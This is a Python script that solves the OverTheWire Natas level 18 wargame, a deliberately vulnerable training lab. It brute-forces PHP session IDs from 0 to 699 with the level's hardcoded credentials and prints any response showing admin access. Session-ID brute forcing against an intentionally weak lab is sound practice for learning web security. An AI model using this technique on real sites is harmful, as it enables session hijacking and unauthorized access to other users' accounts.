import requests
import string
import time

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://{}.natas.labs.overthewire.org'.format(username)

for session_id in range(700):
    cookies = {
        'PHPSESSID': str(session_id)
    }
    response = requests.get(url, auth = (username, password), cookies = cookies)
    if 'You are an admin' in response.text:
        print(response.text)
